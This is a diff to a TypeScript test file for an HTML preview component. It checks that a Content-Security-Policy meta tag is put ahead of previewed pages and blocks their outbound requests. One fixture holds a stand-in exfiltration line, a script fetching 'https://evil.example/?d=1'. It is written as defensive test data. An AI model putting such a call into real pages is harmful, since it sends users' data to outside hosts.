@@ -4,9 +4,11 @@ import { beforeEach, describe, expect, it, vi } from "vitest";
 
 import {
   HtmlPreview,
+  PREVIEW_CSP,
   inlineStyles,
   localStylesheets,
   siblingOf,
+  withPreviewPolicy,
 } from "@/components/code/HtmlPreview";
 import { getFsFile } from "@/lib/api";
 import { renderWithProviders } from "@/test/utils";
@@ -77,6 +79,26 @@ describe("HtmlPreview", () => {
     expect(await screen.findByText(/not loaded here|could not be loaded/i)).toBeTruthy();
   });
 
+  it("gives the frame its own policy, ahead of anything the page wrote", async () => {
+    // The frame used to have no policy at all: a page's `fetch` or `<img src="https://…">` went
+    // wherever it pointed. The meta is the frame's half (the app page's header is the other).
+    const { container } = renderWithProviders(
+      <HtmlPreview workspace="/proj" path="index.html" source={PAGINA} />,
+    );
+    await waitFor(() => {
+      const doc = container.querySelector("iframe")?.getAttribute("srcdoc") ?? "";
+      expect(doc).toContain("rebeccapurple");
+    });
+    const doc = container.querySelector("iframe")?.getAttribute("srcdoc") ?? "";
+    expect(doc.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}">`)).toBe(true);
+  });
+
+  it("says exactly what loads, including the one site charts need", async () => {
+    vi.mocked(getFsFile).mockResolvedValue({ content: "", note: "", truncated: false } as never);
+    renderWithProviders(<HtmlPreview workspace="/proj" path="chart.html" source="<p>x</p>" />);
+    expect(await screen.findByText(/cdn\.jsdelivr\.net/)).toBeTruthy();
+  });
+
   it("still offers the source", async () => {
     const user = userEvent.setup();
     const { container } = renderWithProviders(
@@ -116,5 +138,37 @@ describe("what gets inlined", () => {
     expect(siblingOf("site/index.html", "style.css")).toBe("site/style.css");
     expect(siblingOf("site/index.html", "./style.css")).toBe("site/style.css");
     expect(siblingOf("index.html", "style.css")).toBe("style.css");
+  });
+});
+
+describe("the preview policy", () => {
+  const policy = (doc: string) => /content="([^"]*)"/.exec(doc)?.[1] ?? "";
+  const directive = (csp: string, name: string) =>
+    csp.split(";").map((d) => d.trim()).find((d) => d.startsWith(`${name} `)) ?? "";
+
+  it("refuses every way a page sends something out on its own", () => {
+    const csp = policy(withPreviewPolicy("<p>x</p>"));
+    expect(directive(csp, "default-src")).toBe("default-src 'none'");
+    expect(directive(csp, "connect-src")).toBe("connect-src 'none'");
+    expect(directive(csp, "img-src")).toBe("img-src data: blob:");
+    expect(directive(csp, "font-src")).toBe("font-src data:");
+    expect(directive(csp, "frame-src")).toBe("frame-src 'none'");
+    expect(directive(csp, "form-action")).toBe("form-action 'none'");
+    expect(directive(csp, "object-src")).toBe("object-src 'none'");
+    // What render_chart needs, and only that host — measured: without 'unsafe-eval' Vega draws nothing.
+    expect(directive(csp, "script-src")).toBe("script-src 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net");
+  });
+
+  it("goes before a script the page opens with, so the script runs under it", () => {
+    // A meta policy governs only what follows it. After `<head>` would be too late for this page.
+    const page = "<script>fetch('https://evil.example/?d=1')</script><head></head><body></body>";
+    const doc = withPreviewPolicy(page);
+    expect(doc.indexOf("Content-Security-Policy")).toBeLessThan(doc.indexOf("<script>"));
+    expect(doc.startsWith("<meta ")).toBe(true);
+  });
+
+  it("keeps a leading doctype first, so the page stays in standards mode", () => {
+    const doc = withPreviewPolicy("<!-- made by the agent -->\n<!DOCTYPE html><html><head></head></html>");
+    expect(doc.startsWith("<!-- made by the agent -->\n<!DOCTYPE html><meta ")).toBe(true);
   });
 });
